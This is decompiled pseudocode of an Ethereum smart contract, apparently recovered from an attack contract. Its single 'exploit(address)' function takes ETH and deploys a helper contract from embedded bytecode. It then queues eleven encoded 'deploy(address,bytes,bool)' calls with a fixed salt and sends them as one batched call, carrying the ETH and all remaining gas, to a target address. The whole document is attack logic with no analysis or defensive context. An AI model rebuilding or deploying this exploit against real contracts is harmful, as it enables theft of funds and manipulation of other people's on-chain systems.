contract main {




// =====================  Runtime code  =====================


array of uint256 calls;

function calls(uint256 arg1) {
    return calls[arg1][0 len calls[arg1].length]
}

function _fallback() payable {
    revert
}

function exploit(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    if msg.value <= 0:
        revert with 0, 'must send some ETH'
    create contract with 0 wei
                    code: code.data[2397 len 367]
    if not create.new_address:
        revert with ext_call.return_data[0 len return_data.size]
    calls.length = 0
    mem[0] = 0
    idx = 0
    while sha3(0) + calls.length > idx + sha3(mem[0]):
        uint256(stor[idx + sha3(mem[0])].field_0) = 0
        if 31 < stor[idx + sha3(mem[0])].length:
            mem[0] = idx + sha3(mem[0])
            s = sha3(idx + sha3(mem[0]))
            while sha3(idx + sha3(mem[0])) + (stor[idx + sha3(mem[0])].length + 31 / 32) > s:
                uint256(stor[s].field_0) = 0
                s = s + 1
                continue 
        idx = idx + 1
        continue 
    mem[96] = 8
    mem[128] = '0x123456'
    mem[192] = address(create.new_address)
    mem[224] = 96
    mem[288] = 8
    mem[320] = '0x123456'
    mem[328] = 0
    mem[256] = 0
    mem[160] = 160
    mem[352] = 26
    mem[384] = 'deploy(address,bytes,bool)'
    mem[448] = Mask(32, 224, sha3('deploy(address,bytes,bool)'))
    mem[452 len 160] = address(create.new_address), 96, 0, 8, '0x123456', 0
    mem[416] = 164
    mem[64] = 612
    idx = 0
    while idx < 11:
        calls.length++
        mem[0] = sha3(0) + calls.length
        calls[calls.length] = 329
        t = sha3(sha3(0) + calls.length)
        s = 448
        while 612 > s:
            uint256(stor[t].field_0) = mem[s]
            t = t + 1
            s = s + 32
            continue 
        s = sha3(sha3(0) + calls.length) + 6
        while sha3(sha3(0) + calls.length) + (calls[calls.length].length + 31 / 32) > s:
            uint256(stor[s].field_0) = 0
            s = s + 1
            continue 
        idx = idx + 1
        continue 
    mem[612] = 0xd2423b5100000000000000000000000000000000000000000000000000000000
    mem[616] = 64
    mem[680] = calls.length
    mem[0] = 0
    idx = 0
    s = 0
    t = (32 * calls.length) + 712
    u = 712
    while idx < calls.length:
        mem[u] = t - 712
        if not bool(stor[s + sha3(mem[0])].field_0):
            mem[t] = stor[s + sha3(mem[0])].field_1 % 128
            mem[t + 32] = Mask(248, 8, uint256(stor[s + sha3(mem[0])].field_0))
            idx = idx + 1
            s = s + 1
            t = t + 64
            u = u + 32
            continue 
        if bool(stor[s + sha3(mem[0])].field_0) != 1:
            idx = idx + 1
            s = s + 1
            t = 0
            u = u + 32
            continue 
        mem[t] = uint255(stor[s + sha3(mem[0])].field_1)
        mem[0] = s + sha3(mem[0])
        v = 0
        w = sha3(s + sha3(mem[0]))
        while v < uint255(stor[s + sha3(mem[0])].field_1):
            mem[t + v + 32] = uint256(stor[w].field_0)
            v = v + 32
            w = w + 1
            continue 
        idx = idx + 1
        s = s + 1
        t = t + v + 32
        u = u + 32
        continue 
    mem[648] = 1
    require ext_code.size(arg1)
    call arg1.mem[mem[64] len 4] with:
       value msg.value wei
         gas gas_remaining wei
        args mem[mem[64] + 4 len t + -mem[64] - 4]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}



}
